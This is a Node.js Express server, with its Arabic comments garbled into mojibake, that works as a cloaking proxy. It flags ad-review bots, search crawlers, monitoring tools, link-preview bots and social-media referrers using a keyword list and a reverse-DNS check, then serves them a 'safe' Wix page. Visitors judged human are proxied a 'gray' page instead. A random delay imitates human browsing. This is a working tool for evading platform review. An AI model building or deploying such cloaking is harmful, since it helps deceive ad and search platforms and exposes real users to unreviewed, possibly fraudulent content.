const express = require("express");
const app = express();
const axios = require("axios"); // ุชุฃูุฏ ูู ุชุซุจูุชู: npm install axios
const dns = require('dns');     // ูุฐู ูุญุฏุฉ ูุถููุฉ ูู Node.js
const requestIp = require('request-ip'); // ูู ุจุชุซุจูุช ูุฐู ุงูููุชุจุฉ: npm install request-ip

// --- ุฅุนุฏุงุฏุงุช ุงูุชููุฆุฉ ---
// ููููู ููู ูุฐู ุฅูู ููู .env ุฃู ููู config.js ููุฑููุฉ ุฃูุถู
const PORT = process.env.PORT || 3000;

// ุนูุงููู URL ุงููุณุชูุฏูุฉ. ูููู ุชุนููููุง ููุชุบูุฑุงุช ุจูุฆุฉ.
const SAFE_PAGE = process.env.SAFE_PAGE || "https://treesaudia.wixstudio.com/website/blank-4"; // ุตูุญุฉ ุขููุฉ ููุฑูุจูุชุงุช
const GRAY_PAGE = process.env.GRAY_PAGE || "https://treesaudia.wixstudio.com/website";       // ุตูุญุฉ ุฑูุงุฏูุฉ ููุฒูุงุฑ ุงูุญูููููู

// ูุงุฆูุฉ ููุณุนุฉ ุจุงููููุงุช ุงูููุชุงุญูุฉ ููุฑูุจูุชุงุช ุงูุดุงุฆุนุฉุ ูุจุฑุงูุฌ ุงูุฒุญูุ ูุฎุฏูุงุช ุงููุฑุงูุจุฉ
const BOT_KEYWORDS = [
  "adsbot", "googlebot", "mediapartners-google", "bingbot", "yandexbot", "baiduspider",
  "crawler", "spider", "render", "wget", "curl", "python-requests", "node-fetch",
  "monitor", "uptimerobot", "pingdom", "gtmetrix", "lighthouse",
  "facebookexternalhit", "slackbot", "telegrambot", "discordbot", "preview",
  "ahrefsbot", "semrushbot", "mj12bot", "dotbot", "petalbot", "rogerbot", "exabot",
  "sitecheckerbot", "screaming frog", "netcraftsurvey", "prerender", "headlesschrome",
  "go-http-client", "okhttp", "urllib", "python", "java", "ruby", "perl", "php" // ุฅุถุงูุฉ ุจุนุถ ุงููุบุงุช ุงูุดุงุฆุนุฉ ููููุชุจุงุช
];

// --- ุฏูุงู ุงููุดู ุนู ุงูุฑูุจูุชุงุช ---

// ุฏุงูุฉ ูุณุงุนุฏุฉ ูุฅุฌุฑุงุก ุจุญุซ DNS ุงูุนูุณู ููุชุญูู ูู Googlebot
async function isGooglebotIP(ip) {
  return new Promise(resolve => {
    if (!ip) return resolve(false);

    // Node's dns.reverse ูููููุง ุงูุชุนุงูู ูุน IPv4 ู IPv6.
    // ููุชุญูู ุงูุฏููู ูู Googlebotุ ูุญุชุงุฌ ุฅูู ุงูุชุฃูุฏ ูู ุฃู ุจุญุซ DNS ุงูุนูุณู ูุทุงุจู
    // ูุทุงู googlebot.com ุฃู google.com (ูุฎุฏูุงุช Google).
    dns.reverse(ip, (err, hostnames) => {
      if (err) {
        // console.error(`Reverse DNS error for ${ip}:`, err.message); // ูู ุจุฅูุบุงุก ุงูุชุนููู ููุชุตุญูุญ
        return resolve(false);
      }
      const isGoogle = hostnames.some(hostname =>
        hostname.endsWith('.googlebot.com') || hostname.endsWith('.google.com')
      );
      resolve(isGoogle);
    });
  });
}

// ุฏุงูุฉ ูุชุญุฏูุฏ ูุง ุฅุฐุง ูุงู ุงูุฒุงุฆุฑ ุฑูุจูุชูุง
async function isBot(req) {
  const ua = (req.headers['user-agent'] || "").toLowerCase();
  const ip = req.ip; // ุงุณุชุฎุฏู IP ุงูุฐู ุชู ุงูุญุตูู ุนููู ุจูุงุณุทุฉ request-ip

  // 1. ูุญุต ุณูุณูุฉ ูููู ุงููุณุชุฎุฏู (User-Agent)
  const isUserAgentBot = BOT_KEYWORDS.some(bot => ua.includes(bot));
  if (isUserAgentBot) return true;

  // 2. ุจุญุซ DNS ุงูุนูุณู ุนู Googlebot (ูุคุดุฑ ููู ูู Google)
  const isReverseDNSGoogle = await isGooglebotIP(ip);
  if (isReverseDNSGoogle) return true;

  // 3. ูุญุต ุงูุฑุคูุณ ุงููุดุชุฑูุฉ ุงูุชู ูุฏ ููุชูุฏูุง ุงูุฑูุจูุช (ูุซู ุงููุชุตูุญุงุช ุจูุง ุฑุฃุณ)
  // ูู ุญุฐุฑูุง ููุงุ ูุฏ ููุชูุฑ ุจุนุถ ุงููุณุชุฎุฏููู ุงูุดุฑุนููู ุฅูู ุจุนุถ ูุฐู ุงูุฑุคูุณ.
  // ูููู ุงุณุชุฎุฏุงู ูุฐุง ูุนูุงูุฉ ุซุงูููุฉ.
  const commonHeadersPresent = (
    req.headers['accept'] &&
    req.headers['accept-language'] &&
    req.headers['accept-encoding']
  );
  if (isUserAgentBot === false && !commonHeadersPresent) {
    // console.log(`Potential bot: Missing common headers for IP: ${ip}, UA: ${ua}`); // ูู ุจุฅูุบุงุก ุงูุชุนููู ููุชุตุญูุญ
    // return true; // ูู ุจุฅูุบุงุก ุงูุชุนููู ุฅุฐุง ููุช ุชุฑูุฏ ุฃู ูููู ูุฐุง ูุคุดุฑุงู ูููุงู ุฌุฏุงู
  }

  return false; // ูู ูุชู ุงููุดู ุนูู ูุฑูุจูุช ุจูุฐู ุงูุทุฑู
}

// ุฏุงูุฉ ุจุณูุทุฉ ููุชุญูู ูู ุชูููุญุงุช ุฃุฎุฑู (ูุซู ุงูุฒูุงุฑ ูู ูุนุงููุงุช Facebook ุฃู Telegram)
function isSuspiciousTraffic(req) {
  const referer = (req.headers['referer'] || "").toLowerCase();
  // ุบุงูุจูุง ูุง ุชุณุชุฎุฏู ูุฐู ูู ูุจู ุฑูุจูุชุงุช ูุนุงููุฉ ูุณุงุฆู ุงูุชูุงุตู ุงูุงุฌุชูุงุนู ุฃู ูุงุณุญุงุช ุงูุฑูุงุจุท.
  return referer.includes("facebook.com") || referer.includes("t.co") || referer.includes("telegram") || referer.includes("linkedin.com");
}

// --- ุฏุงูุฉ ูููู ุงููุญุชูู (Proxy) ---

// ุฏุงูุฉ ูุฌูุจ ุงููุญุชูู ูู ุนููุงู URL ูุณุชูุฏู ูุชูุฌููู ุฅูู ุงูุงุณุชุฌุงุจุฉ
async function proxyContent(targetUrl, req, res) {
  try {
    // ูู ุจุจูุงุก ุงูุฑุคูุณ ูุชููุฑูุง ุฅูู ุงูุฎุงุฏู ุงููุฏู
    const headersToForward = {
      'User-Agent': req.headers['user-agent'],
      'Accept': req.headers['accept'],
      'Accept-Encoding': req.headers['accept-encoding'],
      'Accept-Language': req.headers['accept-language'],
      // 'Cookie': req.headers['cookie'] // ูู ุจุฅุฒุงูุฉ ุฃู ุชุตููุฉ ุงูููููุฒ ุฅุฐุง ูู ุชูู ุถุฑูุฑูุฉ
                                     // ุชูุฑูุฑ ุงูููููุฒ ูุฏ ูุคุฏู ุฅูู ุณููู ุบูุฑ ูุชููุน ุฃู ูุดููุงุช ุฎุตูุตูุฉ
    };

    // ุฅุนุฏุงุฏุงุช axios ููููุงูุฉ (Proxy)
    const axiosConfig = {
      method: req.method, // ุงุณุชุฎุฏู ุทุฑููุฉ ุงูุทูุจ ุงูุฃุตููุฉ (GET, POST, etc.)
      url: targetUrl + req.url, // ูู ุจุชูุฑูุฑ ูุณุงุฑ URL ุงูุฃุตูู
      responseType: 'stream',   // ููุญุตูู ุนูู ุงุณุชุฌุงุจุฉ ูู stream
      headers: headersToForward, // ุงูุฑุคูุณ ุงูุชู ุณูุชู ุชูุฑูุฑูุง
      validateStatus: status => true // ูุง ุชููู ุฎุทุฃ ุนูู ุฑููุฒ ุญุงูุฉ HTTP ุบูุฑ ุงููุงุฌุญุฉ (ูุซู 404ุ 500)
    };

    // ุฅุฐุง ูุงู ุงูุทูุจ ูุชุถูู Body (ูุซู POST ุฃู PUT)ุ ูู ุจุชุถูููู
    if (req.method === 'POST' || req.method === 'PUT' || req.method === 'PATCH') {
      axiosConfig.data = req.body; // ุชุฃูุฏ ุฃู middleware ูุชุญููู ุงูู body ูููุนู
    }

    const response = await axios(axiosConfig);

    // ุงูุณุฎ ุงูุฑุคูุณ ุงูุฃุณุงุณูุฉ ูู ุงุณุชุฌุงุจุฉ ุงููุฏู ุฅูู ุงุณุชุฌุงุจุชู
    for (const key in response.headers) {
      const value = response.headers[key];
      // ุงุณุชุจุนุฏ ุฑุคูุณ ุงูููู ุงูุชู ูุง ุชุชุนูู ุจุงุณุชุฌุงุจุฉ ุงูุนููู
      if (!['connection', 'keep-alive', 'proxy-authenticate', 'proxy-authorization', 'te', 'trailers', 'transfer-encoding', 'upgrade', 'host'].includes(key.toLowerCase())) {
        res.setHeader(key, value);
      }
    }

    // ูู ุจุชุนููู ุฑูุฒ ุญุงูุฉ ููุงุณุจ (ุนูู ุณุจูู ุงููุซุงูุ 200 OKุ 404 Not Foundุ ุฅูุฎ)
    res.status(response.status);

    // ูู ุจุชูุฌูู ุงูุจูุงูุงุช ูุจุงุดุฑุฉ ุฅูู ุงูุงุณุชุฌุงุจุฉ
    response.data.pipe(res);

  } catch (error) {
    console.error(`Error proxying content from ${targetUrl}:`, error.message);
    if (error.response) {
        // ุฅุฐุง ูุงู ููุงู ุงุณุชุฌุงุจุฉ ูู ุงูุฎุงุฏู ุงููุฏูุ ุงุณุชุฎุฏู ุฑูุฒ ุงูุญุงูุฉ ุงูุฎุงุต ุจูุง
        res.status(error.response.status).send(`Error: Could not load content from ${targetUrl}`);
    } else {
        // ุฎุทุฃ ุนุงู ูู ุงูุดุจูุฉ ุฃู axios
        res.status(500).send("Error loading page. Please try again later.");
    }
  }
}

// --- ุฅุนุฏุงุฏุงุช Express Middleware ---

// Middleware ูุชุญุฏูุฏ IP ุงูุนููู ุจุดูู ููุซูู (ูุฏุนู X-Forwarded-For ู Cloudflare)
app.use(requestIp.mw());

// Middleware ูุชุญููู JSON bodies (ููู ูุทูุจุงุช POST/PUT)
app.use(express.json());
// Middleware ูุชุญููู URL-encoded bodies (ููู ูุทูุจุงุช POST/PUT ูู ุงูููุงุฐุฌ)
app.use(express.urlencoded({ extended: true }));

// --- ูุณุงุฑ ูุนุงูุฌุฉ ุงูุทูุจุงุช ---

// ุงุณุชุฎุฏู '*' ููุชุนุงูู ูุน ุฌููุน ุงููุณุงุฑุงุช ูุงูุทูุจุงุช ุงููุงุฏูุฉ ุฅูู ุงูุฎุงุฏู ุงูุฎุงุต ุจู
app.all("*", async (req, res) => { // ุงุณุชุฎุฏู app.all ููุชุนุงูู ูุน ุฌููุน ุทุฑู HTTP (GET, POST, PUT, DELETE, ุฅูุฎ)
  const ua = req.headers['user-agent'] || "no-agent";
  const ip = req.ip || "no-ip"; // IP ูู request-ip middleware
  const method = req.method;
  const path = req.originalUrl;

  console.log(`[${new Date().toISOString()}] Method: ${method} | Path: ${path} | User-Agent: ${ua} | IP: ${ip}`);

  // ูู ุจุฅุฏุฎุงู ุชุฃุฎูุฑ ุนุดูุงุฆู ููุญุงูุงุฉ ุณููู ุงูุชุตูุญ ุงูุจุดุฑู.
  // ุงุฌุนูู ูุตูุฑูุง ุจูุง ูููู ูุนุฏู ุงูุชุณุจุจ ูู ุงูุชูุงุก ุงููููุฉ ูุจุฑุงูุฌ ุงูุฒุญู ุงูุดุฑุนูุฉ.
  await new Promise(resolve => setTimeout(resolve, Math.floor(Math.random() * 500) + 100)); // ุจูู 100 ูููู ุซุงููุฉ ู 600 ูููู ุซุงููุฉ

  // ุญุฏุฏ ูุง ุฅุฐุง ูุงู ุฑูุจูุชูุง ุฃู ุญุฑูุฉ ูุฑูุฑ ูุดุจููุฉ
  const isDetectedBot = await isBot(req); // ุงูุชุธุฑ ูุชูุฌุฉ ุงูุฏุงูุฉ ุบูุฑ ุงููุชุฒุงููุฉ
  const isDetectedSuspiciousTraffic = isSuspiciousTraffic(req);

  if (isDetectedBot || isDetectedSuspiciousTraffic) {
    console.log("๐ก๏ธ ุชู ุงูุชุดุงู ุฑูุจูุช/ุญุฑูุฉ ูุฑูุฑ ูุดุจููุฉ - ููุงูุฉ ุตูุญุฉ SAFE");
    await proxyContent(SAFE_PAGE, req, res); // ููุงูุฉ ุงูุตูุญุฉ ุงูุขููุฉ
  } else {
    console.log("๐ค ูุณุชุฎุฏู ุจุดุฑู - ููุงูุฉ ุตูุญุฉ GRAY");
    await proxyContent(GRAY_PAGE, req, res); // ููุงูุฉ ุงูุตูุญุฉ ุงูุฑูุงุฏูุฉ
  }
});

// --- ุจุฏุก ุงูุฎุงุฏู ---
app.listen(PORT, () => {
  console.log(`๐ ุงูุฎุงุฏู ูุนูู ุนูู ุงููููุฐ ${PORT}`);
  console.log(`ุตูุญุฉ ุงูุฑูุจูุชุงุช (SAFE_PAGE): ${SAFE_PAGE}`);
  console.log(`ุตูุญุฉ ุงูุฒูุงุฑ (GRAY_PAGE): ${GRAY_PAGE}`);
});
